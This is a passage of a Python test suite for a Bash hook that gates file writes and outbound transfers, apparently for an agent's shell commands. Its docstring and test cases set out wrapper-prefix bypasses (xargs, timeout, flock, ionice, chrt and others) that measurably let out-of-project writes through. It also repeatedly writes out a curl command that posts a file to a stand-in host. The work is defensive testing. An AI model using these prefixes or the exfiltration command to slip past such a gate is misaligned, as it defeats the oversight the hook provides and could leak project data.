"""Cycle P: six wrapper prefixes hide both a Bash write and a data transfer.

`verb_at` in `hooks/scripts/writ-bash-write-gate.sh` steps over a command prefix
only by membership in `WRAPPERS`, so `xargs`, `timeout`, `nice`, `stdbuf`, `watch`
and `setsid` become `cmd0` themselves and the real command is never resolved.
Because `verb_at` is the single source for the write-target pass and the egress
pass, each prefix hides a write AND a transfer. MEASURED before the fix (do not
re-derive; see plan.md ## Analysis):

    ls | xargs cp -t src                  -> set()
    ls | xargs -I{} cp {} src/y.py        -> set()
    timeout 5 cp seed.txt src/y.py        -> set()
    nice -n 5 cp seed.txt src/y.py        -> set()
    stdbuf -oL cp seed.txt src/y.py       -> set()
    watch -n1 cp seed.txt src/y.py        -> set()
    setsid cp seed.txt src/y.py           -> set()

    ls | xargs curl -d @src/a.txt https://example.invalid   -> set()
    timeout 5 curl -d @src/a.txt https://example.invalid    -> set()
    setsid curl -d @src/a.txt https://example.invalid       -> set()

Cycle S closes three more: `flock`, `ionice`, `chrt`. MEASURED this cycle, at the OUTER
hook layer (not the embedded extractor above), with an out-of-project write target and
`nice` (an existing WRAPPERS member) as a registered-wrapper positive control:

    cp README.md ~/outside_probe.txt                     -> DENY  [ENF-PROJECT...]
    nice cp README.md ~/outside_probe.txt                -> DENY  (nice IS in WRAPPERS)
    flock /tmp/l.lock cp README.md ~/outside_probe.txt   -> ALLOW (blind, no output)
    ionice -c3 cp README.md ~/outside_probe.txt          -> ALLOW (blind, no output)
    chrt -b 0 cp README.md ~/outside_probe.txt           -> ALLOW (blind, no output)

CORRECTED (plan.md dfacff61-23d5-474e-846c-2e2f0f0ea482, the bash-expansion-boundary
cycle): the two measurements above were taken FROM A CWD OUTSIDE THE PROJECT, and that is
the whole explanation for the first row's DENY -- with cwd outside, `<cwd>/~/outside_
probe.txt` is out of project too (any relative-looking join is), so the deny came from the
CWD boundary, not from `~` being resolved. At measurement time the write gate had (and
still has, until that cycle's fix lands) no tilde/parameter expansion at all: the token
`~/outside_probe.txt` reached classification as the literal seven-and-more characters it
is. The verdict is real and the wrapper-prefix CONTRAST it proves (flock/ionice/chrt blind,
nice caught) is still valid and still what this module's tests below pin; only the READING
of the first row as "evidence that tilde targets are handled" is wrong, and that
misreading is why the tilde-classification gap stayed invisible for as long as it did. No
executable assertion in this module depends on the `~/outside_probe.txt` spelling (the
full-hook tests below use `.env` and an egress host instead), so nothing here goes red from
this correction.

flock, ionice and chrt are not yet WRAPPERS members, so verb_at returns the wrapper's own
name as cmd0 for all three, matching none of the write arms and no egress verb -- the exact
mechanism as cycle P, not the bash-side hot-path (which is not re-checked here; see plan.md
## Analysis, which re-verified it structurally for this cycle rather than re-measuring it).
TestFullHookPrefixProof below drives the real hook at this exact layer for all three.

The three flag tables (FLOCK_*, IONICE_*, CHRT_*) are written against a THIRD source of
evidence beyond both the extractor and the full hook: `--help` output read directly off the
installed binaries on this machine, which corrects two members plan.md's own bash-completion
-derived draft got wrong (see TestIoniceFlagEdges' docstring for the one that changes a
flag's VALUE/NOVALUE classification, not just its spelling).

This module follows the shape of tests/test_bash_group_construct_gate.py and
tests/test_bash_control_operator_split.py: the populations are DERIVED from the
hook (the prefix axis from its own WRAPPERS table via wrapper_names, the consumer
axis from its own cmd0 write arms via write_verb_arms), and each derivation is
asserted non-empty so no cell can pass vacuously.

NOTHING HERE ASSERTS ON DOCUMENTATION PROSE. The header's uncovered-prefix block
is pinned as a derived consistency ratchet in tests/test_bash_egress_gate.py
(an existing prose ratchet being updated, not a new one), not here.
"""
from __future__ import annotations

import ast
import os
import subprocess
import sys
from pathlib import Path

import pytest

# autouse: pins cwd to a sandbox, this suite's standing convention.
from tests.fixtures.session_state import sandbox_cwd  # noqa: F401
from tests.test_bash_control_operator_split import write_verb_arms
from tests.test_bash_egress_gate import _extract_egress, uncovered_prefix_names
from tests.test_bash_group_construct_gate import _mutate, _mutated_extract
from tests.test_bash_write_gate import (
    HOOK_SH,
    SKILL_ROOT,
    _extract,
    _extractor_src,
    _run_hook,
    _seed,
    nested_cmd_flags,
    wrapper_names,
)

CWD, SRC, TARGET, TDIR = "/proj", "seed.txt", "src/y.py", "src"
EXPECTED_TARGET = ("local", CWD + "/" + TARGET)
EXPECTED_TDIR = ("local", CWD + "/" + TDIR)
EGRESS_HOST = "example.invalid"
EGRESS_CMD = "curl -d @src/a.txt https://example.invalid"

# One spelling per WRAPPERS member. `xargs` gets its natural piped spelling; the cycle P
# and cycle S members get the exact spellings measured silent in each cycle's plan.
PREFIXES = {
    "command": "command {cmd}",
    "env":     "env FOO=1 {cmd}",
    "exec":    "exec {cmd}",
    "nohup":   "nohup {cmd}",
    "time":    "time {cmd}",
    "sudo":    "sudo {cmd}",
    "doas":    "doas {cmd}",
    "timeout": "timeout 5 {cmd}",
    "nice":    "nice -n 5 {cmd}",
    "stdbuf":  "stdbuf -oL {cmd}",
    "watch":   "watch -n1 {cmd}",
    "setsid":  "setsid {cmd}",
    "xargs":   "ls | xargs {cmd}",
    "flock":   "flock /tmp/l.lock {cmd}",
    "ionice":  "ionice -c3 {cmd}",
    "chrt":    "chrt -b 0 {cmd}",
}

CONSUMERS = {
    "redirect":      ("echo x > {t}", EXPECTED_TARGET),
    "append":        ("echo x >> {t}", EXPECTED_TARGET),
    "tee":           ("tee {t}", EXPECTED_TARGET),
    "dd":            ("dd if=/dev/zero of={t}", EXPECTED_TARGET),
    "cp_dest":       ("cp %s {t}" % SRC, EXPECTED_TARGET),
    "mv_dest":       ("mv %s {t}" % SRC, EXPECTED_TARGET),
    "install_dest":  ("install %s {t}" % SRC, EXPECTED_TARGET),
    "cp_target_dir": ("cp -t {d} %s" % SRC, EXPECTED_TDIR),
    "sed_i":         ("sed -i s/a/b/ {t}", EXPECTED_TARGET),
}

MATRIX = [(p, k, ptpl.format(cmd=ktpl.format(t=TARGET, d=TDIR)), expected)
          for p, ptpl in sorted(PREFIXES.items())
          for k, (ktpl, expected) in sorted(CONSUMERS.items())]

EGRESS_MATRIX = [(p, ptpl.format(cmd=EGRESS_CMD)) for p, ptpl in sorted(PREFIXES.items())]

CORRUPTING = ";&|"


# --------------------------------------------------------------------------- #
# 1. the populations, DERIVED from the hook rather than listed here
# --------------------------------------------------------------------------- #
class TestTheMatrixIsDerivedAndComplete:
    """A derivation that silently returned nothing would make every cell below
    vacuous -- this repo's most repeated failure this session."""

    def test_the_derived_populations_are_non_empty(self):
        assert wrapper_names(_extractor_src())
        assert write_verb_arms(_extractor_src())

    def test_matrix_is_not_empty(self):
        assert MATRIX

    def test_egress_matrix_is_not_empty(self):
        assert EGRESS_MATRIX

    def test_matrix_covers_the_full_cross_product(self):
        assert len(MATRIX) == len(PREFIXES) * len(CONSUMERS)

    def test_egress_matrix_covers_every_prefix(self):
        assert len(EGRESS_MATRIX) == len(PREFIXES)

    def test_prefix_axis_equals_the_hooks_own_wrappers_keys(self):
        # A future WRAPPERS entry with no matrix cell reddens HERE rather than
        # shipping uncovered.
        assert set(PREFIXES) == wrapper_names(_extractor_src())

    def test_every_write_verb_arm_appears_in_some_consumer_template(self):
        # Asked as "appears in SOME template", not "is the template's first word":
        # `tee`'s template is `tee {t}` here (unlike the piped form elsewhere), and
        # the correction tests/test_bash_control_operator_split.py:162-175 already
        # documents applies just as much to this matrix's own consumer set.
        arms = write_verb_arms(_extractor_src())
        templates = " ".join(ktpl for ktpl, _e in CONSUMERS.values())
        missing = {a for a in arms if a not in templates}
        assert not missing, f"write verb arms with no matrix cell: {sorted(missing)}"


# --------------------------------------------------------------------------- #
# 2. the matrix itself: every prefix resolves the real verb behind it
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "prefix,consumer,cmd,expected",
    MATRIX,
    ids=["%s-%s" % (p, k) for p, k, _c, _e in MATRIX],
)
def test_matrix_cell_emits_the_clean_row(prefix, consumer, cmd, expected):
    rows = _extract(cmd)
    assert expected in rows, (cmd, rows)
    corrupt = [path for _kind, path in rows if any(ch in path for ch in CORRUPTING)]
    assert not corrupt, (cmd, corrupt)


@pytest.mark.parametrize(
    "prefix,cmd",
    EGRESS_MATRIX,
    ids=[p for p, _c in EGRESS_MATRIX],
)
def test_egress_matrix_cell_emits_the_host(prefix, cmd):
    rows = _extract_egress(cmd)
    assert any(host == EGRESS_HOST for host, _detail in rows), (cmd, rows)


# --------------------------------------------------------------------------- #
# 3. per-prefix flag edge cases: glued value, spaced value, `--`, unknown flag
# --------------------------------------------------------------------------- #
class TestStdbufFlagEdges:
    def test_glued_value_resolves_the_verb(self):
        cmd = "stdbuf -oL cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_unknown_flag_detects_nothing(self):
        cmd = "stdbuf -Q cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == set(), cmd

    def test_unknown_flag_egress_detects_nothing(self):
        cmd = "stdbuf -Q %s" % EGRESS_CMD
        assert _extract_egress(cmd) == set(), cmd

    def test_unknown_flag_still_extracts_a_plain_redirect(self):
        # The bail suppresses VERB-based extraction only; the redirect scan runs
        # over the whole segment regardless (the documented `sudo` precedent).
        cmd = "stdbuf -Q echo x > %s" % TARGET
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd


class TestXargsFlagEdges:
    def test_glued_capture_flag_resolves_the_verb(self):
        cmd = "ls | xargs -I{} cp {} %s" % TARGET
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_glued_max_args_flag_resolves_the_verb(self):
        cmd = "xargs -n1 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_spaced_max_args_flag_resolves_the_verb(self):
        cmd = "xargs -n 1 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_double_dash_resolves_the_verb(self):
        cmd = "xargs -- cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_unknown_flag_detects_nothing(self):
        cmd = "xargs -Z cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == set(), cmd

    def test_unknown_flag_egress_detects_nothing(self):
        cmd = "xargs -Z %s" % EGRESS_CMD
        assert _extract_egress(cmd) == set(), cmd

    def test_disclosed_miss_glued_optional_argument_short_stays_silent(self):
        # `-i` is optional-argument; GNU requires it glued when given. Listing it
        # NOVALUE resolves the common `-i cp ...` spelling but bails on the glued
        # `-iX` spelling (unknown letter after `-i`). Named in the header's
        # uncovered block (asserted in tests/test_bash_egress_gate.py).
        cmd = "xargs -iX cp {} %s" % TARGET
        assert _extract(cmd) == set(), cmd


class TestWatchFlagEdges:
    def test_glued_interval_resolves_the_verb(self):
        cmd = "watch -n1 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_spaced_interval_resolves_the_verb(self):
        cmd = "watch -n 5 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_unknown_flag_detects_nothing(self):
        cmd = "watch --bogus cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == set(), cmd

    def test_unknown_flag_egress_detects_nothing(self):
        cmd = "watch --bogus %s" % EGRESS_CMD
        assert _extract_egress(cmd) == set(), cmd

    def test_disclosed_miss_quoted_command_string_stays_silent(self):
        # The whole quoted command arrives as ONE token; shlex(posix=False) keeps
        # the quote characters, dequote yields the whole string as one name, and no
        # cmd0 arm matches. Named in the header's uncovered block.
        cmd = "watch -n1 'cp %s %s'" % (SRC, TARGET)
        assert _extract(cmd) == set(), cmd


class TestNiceFlagEdges:
    def test_glued_value_resolves_the_verb(self):
        cmd = "nice -n5 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_spaced_value_resolves_the_verb(self):
        cmd = "nice -n 5 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_bare_nice_with_no_flags_resolves_the_verb(self):
        # `nice cp ...` is legal: the flag loop breaks on the first non-dash token
        # and the outer loop resolves it as the verb with no positional step needed.
        cmd = "nice cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_disclosed_miss_obsolete_numeric_flag_stays_silent(self):
        # The obsolete `nice -5 cmd` spelling has `-5` as an unknown option letter,
        # so it bails. Named in the header's uncovered block.
        cmd = "nice -5 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == set(), cmd


class TestSetsidFlagEdges:
    def test_double_dash_resolves_the_verb(self):
        cmd = "setsid -- cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_unknown_flag_detects_nothing(self):
        cmd = "setsid --bogus cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == set(), cmd

    def test_unknown_flag_egress_detects_nothing(self):
        cmd = "setsid --bogus %s" % EGRESS_CMD
        assert _extract_egress(cmd) == set(), cmd

    def test_bare_setsid_resolves_the_verb(self):
        cmd = "setsid cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd


class TestFlockFlagEdges:
    """flock's own STRICT flag table (FLOCK_VALUE_FLAGS / FLOCK_NOVALUE_FLAGS): the real
    -w/--timeout, -E/--conflict-exit-code, -c/--command value flags and the -s -x -u -n -o
    -F --verbose no-value flags, read off `flock --help` on this machine per the dispatch
    brief (NOT plan.md's bash-completion-derived draft table)."""

    def test_glued_value_resolves_the_verb(self):
        """Reddens if -w/--timeout drops out of FLOCK_VALUE_FLAGS."""
        cmd = "flock -w5 /tmp/l.lock cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_spaced_value_resolves_the_verb(self):
        """Reddens if -w/--timeout drops out of FLOCK_VALUE_FLAGS."""
        cmd = "flock -w 5 /tmp/l.lock cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_long_flag_equals_value_resolves_the_verb(self):
        """Reddens if --timeout is missing from FLOCK_VALUE_FLAGS under its long spelling."""
        cmd = "flock --timeout=5 /tmp/l.lock cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_bundled_novalue_shorts_resolve_the_verb(self):
        """Reddens if -x or -n drops out of FLOCK_NOVALUE_FLAGS."""
        cmd = "flock -xn /tmp/l.lock cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_double_dash_resolves_the_verb(self):
        """Reddens if the `--` end-of-options break is removed from verb_at's flag loop."""
        cmd = "flock -- /tmp/l.lock cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_bare_invocation_resolves_the_verb(self):
        """Reddens if the `"flock": (` key in WRAPPERS is removed or renamed."""
        cmd = "flock /tmp/l.lock cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_unknown_flag_detects_nothing(self):
        """Reddens if flock's second WRAPPERS element is swapped for None (PERMISSIVE)."""
        cmd = "flock --bogus /tmp/l.lock cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == set(), cmd

    def test_unknown_flag_egress_detects_nothing(self):
        """Reddens if flock's second WRAPPERS element is swapped for None (PERMISSIVE)."""
        cmd = "flock --bogus %s" % EGRESS_CMD
        assert _extract_egress(cmd) == set(), cmd

    def test_unknown_flag_still_extracts_a_plain_redirect(self):
        """Reddens if the unknown-flag bail is widened to suppress redirect scanning too."""
        cmd = "flock --bogus echo x > %s" % TARGET
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_disclosed_silence_quoted_command_body_stays_silent(self):
        """Disclosed silence, not a defect: pinned so it reddens (and must be REWRITTEN,
        not deleted) the day the extractor starts parsing a quoted command body. flock's
        real `-c/--command` form is `flock [options] file -c command`: the lock target is
        stepped first, then `-c` itself sits in verb position and basename("-c") is not a
        WRAPPERS key, so the whole quoted body is invisible -- the same class as `bash -c`
        and the already-pinned `watch -n1 '...'`."""
        cmd = "flock /tmp/l.lock -c 'cp %s %s'" % (SRC, TARGET)
        assert _extract(cmd) == set(), cmd


class TestIoniceFlagEdges:
    """ionice's own STRICT flag table (IONICE_VALUE_FLAGS / IONICE_NOVALUE_FLAGS): the real
    -c/--class, -n/--classdata, -p/--pid, -P/--pgid, -u/--uid value flags and the single
    -t/--ignore no-value flag, read off `ionice --help` on this machine per the dispatch
    brief. THIS DIVERGES FROM plan.md's DRAFT TABLE, which read -p/-P/-u as NOVALUE off a
    bash-completion file; `--help` shows each takes a following pid/pgid/uid value, so they
    are classified VALUE here instead. The divergence does not flip any pinned behavior --
    ionice's id forms stay silent either way (see TestIdFormsThatRunNoCommandStaySilent)
    because ionice takes no positional of its own regardless of how -p/-P/-u are classified
    -- it only changes which set the flag table itself puts them in."""

    def test_glued_class_value_resolves_the_verb(self):
        """Reddens if -c/--class drops out of IONICE_VALUE_FLAGS."""
        cmd = "ionice -c3 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_spaced_class_value_resolves_the_verb(self):
        """Reddens if -c/--class drops out of IONICE_VALUE_FLAGS."""
        cmd = "ionice -c 3 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_long_flag_equals_value_resolves_the_verb(self):
        """Reddens if --classdata is missing from IONICE_VALUE_FLAGS under its long
        spelling."""
        cmd = "ionice --classdata=2 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_bundled_ignore_and_glued_class_value_resolve_the_verb(self):
        """ionice has only ONE confirmed no-value flag (-t), so there is no second no-value
        letter to bundle it with; this bundles it with a glued value flag (-c) instead, to
        exercise the same bundling branch the other two prefixes' tables exercise with two
        no-value letters. Reddens if -t drops out of IONICE_NOVALUE_FLAGS or -c drops out
        of IONICE_VALUE_FLAGS."""
        cmd = "ionice -tc3 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_double_dash_resolves_the_verb(self):
        """Reddens if the `--` end-of-options break is removed from verb_at's flag loop."""
        cmd = "ionice -- cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_bare_invocation_resolves_the_verb(self):
        """Reddens if the `"ionice": (` key in WRAPPERS is removed or renamed."""
        cmd = "ionice cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_unknown_flag_detects_nothing(self):
        """Reddens if ionice's second WRAPPERS element is swapped for None (PERMISSIVE)."""
        cmd = "ionice --bogus cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == set(), cmd

    def test_unknown_flag_egress_detects_nothing(self):
        """Reddens if ionice's second WRAPPERS element is swapped for None (PERMISSIVE)."""
        cmd = "ionice --bogus %s" % EGRESS_CMD
        assert _extract_egress(cmd) == set(), cmd

    def test_unknown_flag_still_extracts_a_plain_redirect(self):
        """Reddens if the unknown-flag bail is widened to suppress redirect scanning too."""
        cmd = "ionice --bogus echo x > %s" % TARGET
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd


class TestChrtFlagEdges:
    """chrt's own STRICT flag table (CHRT_VALUE_FLAGS / CHRT_NOVALUE_FLAGS): the real
    -T/--sched-runtime, -P/--sched-period, -D/--sched-deadline value flags and the policy
    flags -b -d -f -i -o -r plus -R/--reset-on-fork no-value flags, read off `chrt --help`
    on this machine per the dispatch brief. Only the flags that transcript names are
    asserted here; plan.md's draft also lists -a/--all-tasks, -m/--max and -v/--verbose as
    no-value, which this suite does not exercise because they were not in that transcript."""

    def test_glued_value_resolves_the_verb(self):
        """Reddens if -T/--sched-runtime drops out of CHRT_VALUE_FLAGS."""
        cmd = "chrt -T1000 -b 0 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_spaced_value_resolves_the_verb(self):
        """Reddens if -T/--sched-runtime drops out of CHRT_VALUE_FLAGS."""
        cmd = "chrt -T 1000 -b 0 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_long_flag_equals_value_resolves_the_verb(self):
        """Reddens if --sched-runtime is missing from CHRT_VALUE_FLAGS under its long
        spelling."""
        cmd = "chrt --sched-runtime=1000 -b 0 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_bundled_novalue_shorts_resolve_the_verb(self):
        """Reddens if -b or -R drops out of CHRT_NOVALUE_FLAGS."""
        cmd = "chrt -bR 0 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_double_dash_resolves_the_verb(self):
        """Reddens if the `--` end-of-options break is removed from verb_at's flag loop."""
        cmd = "chrt -- 0 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_bare_invocation_resolves_the_verb(self):
        """Reddens if the `"chrt": (` key in WRAPPERS is removed or renamed."""
        cmd = "chrt 0 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_unknown_flag_detects_nothing(self):
        """Reddens if chrt's second WRAPPERS element is swapped for None (PERMISSIVE)."""
        cmd = "chrt --bogus 0 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == set(), cmd

    def test_unknown_flag_egress_detects_nothing(self):
        """Reddens if chrt's second WRAPPERS element is swapped for None (PERMISSIVE)."""
        cmd = "chrt --bogus %s" % EGRESS_CMD
        assert _extract_egress(cmd) == set(), cmd

    def test_unknown_flag_still_extracts_a_plain_redirect(self):
        """Reddens if the unknown-flag bail is widened to suppress redirect scanning too."""
        cmd = "chrt --bogus echo x > %s" % TARGET
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd


# --------------------------------------------------------------------------- #
# 4. wrapper positionals: timeout's duration, flock's mandatory lock target,
#    chrt's shape-checked priority, and the id forms that run no command at all
# --------------------------------------------------------------------------- #
class TestTimeoutPositional:
    @pytest.mark.parametrize("cmd", [
        "timeout 5 cp %s %s" % (SRC, TARGET),
        "timeout -s KILL 5 cp %s %s" % (SRC, TARGET),
        "timeout -k 1 5 cp %s %s" % (SRC, TARGET),
        "timeout -- 5 cp %s %s" % (SRC, TARGET),
        "timeout 0.5 cp %s %s" % (SRC, TARGET),
        "timeout 5s cp %s %s" % (SRC, TARGET),
    ])
    def test_the_positional_duration_resolves_in_every_measured_form(self, cmd):
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_a_non_duration_shaped_first_positional_is_treated_as_the_verb(self):
        # A duration-less `timeout cp ...` is a command `timeout` itself would
        # reject, so the fail-closed cost is an extra row for a command that never
        # runs, never a lost row for one that does.
        cmd = "timeout cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd


class TestFlockPositional:
    """flock's lock target: a PATH, stepped UNCONDITIONALLY (LOCK_TARGET matches any
    non-empty token), never shape-checked against a duration or a priority -- the opposite
    fail direction from chrt's priority below. THE TRAP: a lock file whose name happens to
    look numeric must still be skipped, so a test that only ever uses a numeric-looking
    lock target would pass even against a wrongly shape-checked implementation and prove
    nothing (see the second test here, which is deliberately NOT the mutation detector)."""

    def test_an_ordinary_lock_path_is_stepped_and_resolves_the_verb(self):
        """THE mutation detector: an ordinary, non-numeric path is what actually catches a
        wrong shape. Reddens when flock's entry in WRAPPER_POSITIONAL_SHAPES is swapped for
        the numeric PRIORITY shape (`/tmp/l.lock` no longer matches, stops being skipped,
        and `l.lock` is misresolved as the verb); also reddens if flock's WRAPPER_POSITIONALS
        count is dropped to 0."""
        cmd = "flock /tmp/l.lock cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_a_bare_numeric_lock_path_is_skipped_the_same_as_an_ordinary_one(self):
        """Correctness pin, NOT a mutation detector for the PRIORITY-shape swap: `200` is
        pure digits, so it would satisfy a wrongly-swapped PRIORITY shape just as well as
        the intended LOCK_TARGET shape -- the test above is what actually pins the
        unconditional skip. This one documents that flock's own real grammar treats the
        first positional as a file whenever a command follows, even when it looks numeric
        (`flock -x 200 cp ...` really does run `cp`, per plan.md's own trace)."""
        cmd = "flock -x 200 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_a_newline_only_lock_target_is_stepped_like_any_other(self):
        """The review finding this cycle nearly shipped: `LOCK_TARGET` was `re.compile(".")`,
        and python's `.` does NOT match a newline without re.DOTALL, so a lock target that
        dequotes to a bare newline was not skipped, the newline was resolved as the verb,
        and the whole segment went silent on the write, credential and egress passes at once.
        Real flock accepts it: a file literally named with a newline is created and the
        wrapped command runs. Measured against the real hook before the fix: this spelling
        ALLOWED an out-of-project write that both an ordinary lock path and the bare command
        DENIED.

        Reddens whenever flock's shape stops matching a newline, which is what
        `re.compile(".")` without DOTALL does.
        """
        cmd = "flock '\n' cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_positional_step_consumes_exactly_one_token_before_a_nested_wrapper(self):
        """The off-by-one detector: only resolves cp if flock's positional step consumed
        EXACTLY one token, leaving `timeout` to be recognized as its own wrapper rather
        than being swallowed as flock's command. Reddens when flock's WRAPPER_POSITIONALS
        count is changed to 2 (a numeric shape would then also wrongly consume `5`, but
        LOCK_TARGET matches any token, so it wrongly consumes `timeout` itself instead)."""
        cmd = "flock /tmp/l.lock timeout 5 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_positional_absent_with_no_downstream_command_does_not_crash(self):
        """`flock` alone (a command flock itself rejects) must leave i past the end and
        yield no verb WITHOUT crashing. Reddens if the `i < len(seg)` guard is dropped from
        the positional step, which would raise IndexError instead of returning silently (a
        crash also yields empty stdout, so the returncode check is what actually catches
        this -- `_extract` alone cannot distinguish a clean silence from a traceback)."""
        env = dict(os.environ, WRIT_BASH_CMD="flock", WRIT_CWD=CWD)
        p = subprocess.run([sys.executable, "-c", _extractor_src()], env=env,
                           capture_output=True, text=True)
        assert p.returncode == 0, p.stderr
        assert _extract("flock") == set()

    def test_a_bare_command_word_in_lock_position_is_read_as_the_lock_path_not_the_verb(self):
        """`flock cp seed.txt src/y.py` really would treat `cp` as the lock file in flock's
        own grammar (no command follows it), so resolving `seed.txt` next -- which matches
        no write arm -- is correct, not a miss. Reddens if flock's WRAPPER_POSITIONALS entry
        is removed, which would instead read `cp` directly as the verb and falsely detect a
        write flock's own grammar would never run this way."""
        cmd = "flock cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == set(), cmd


class TestChrtPositional:
    """chrt's priority: a non-negative integer, SHAPE-CHECKED (PRIORITY = ^[0-9]+$) -- the
    opposite fail direction from flock's unconditional lock-target skip above. A
    priority-less invocation is a command chrt itself would reject ("invalid priority
    argument"), so the fail-closed cost is an extra row for a command that never runs,
    never a lost row for one that does."""

    def test_the_priority_positional_resolves_in_the_measured_default_spelling(self):
        """Reddens if the `"chrt": (` key in WRAPPERS is removed or renamed."""
        cmd = "chrt -b 0 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_a_priority_less_invocation_still_resolves_the_verb(self):
        """`chrt -b cp ...` has no priority for the shape check to consume, so `cp` is read
        directly as the verb instead of being silently swallowed as a bogus priority.
        Reddens when the shape test in the positional loop is forced to True, which would
        wrongly skip `cp` and misresolve `seed.txt` as the verb instead."""
        cmd = "chrt -b cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd


class TestIdFormsThatRunNoCommandStaySilent:
    """ionice's -p/-P/-u id forms and chrt's -p/--pid form run NO downstream command at
    all; none of the three flag tables' classification choices can turn these into a false
    write, because the trailing digits never coincide with a write-arm name."""

    def test_ionice_pid_form_stays_silent(self):
        """Reddens if a WRAPPER_POSITIONALS entry is added for `ionice` (ionice takes no
        positional of its own)."""
        assert _extract("ionice -p 1234") == set()

    def test_chrt_pid_get_form_stays_silent(self):
        """Reddens if chrt's `-p` id form (get form, no priority) starts resolving a verb
        that matches a write arm."""
        assert _extract("chrt -p 1234") == set()

    def test_chrt_pid_set_form_stays_silent(self):
        """Reddens if chrt's `-p` id form (set form, priority then pid) starts resolving a
        verb that matches a write arm."""
        assert _extract("chrt -p 5 1234") == set()


# --------------------------------------------------------------------------- #
# 5. unchanged controls: sudo / env behavior sharing this code path
# --------------------------------------------------------------------------- #
class TestUnchangedSudoAndEnvControls:
    def test_sudo_write_control_unchanged(self):
        cmd = "sudo cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_env_write_control_unchanged(self):
        cmd = "env FOO=1 cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_sudo_spaced_user_flag_control_unchanged(self):
        cmd = "sudo -u deploy cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_sudo_glued_user_flag_control_unchanged(self):
        cmd = "sudo -udeploy cp %s %s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd


# --------------------------------------------------------------------------- #
# 6. deletion stays out of scope; find's exec family (-exec/-execdir/-ok/-okdir)
#    is now CLOSED by cycle Q -- the matrix lives in
#    tests/test_bash_nested_command_gate.py; the false positive this fix must
#    not introduce stays silent
# --------------------------------------------------------------------------- #
class TestMustStaySilentAfterTheFix:
    def test_find_pipe_xargs_rm_stays_silent(self):
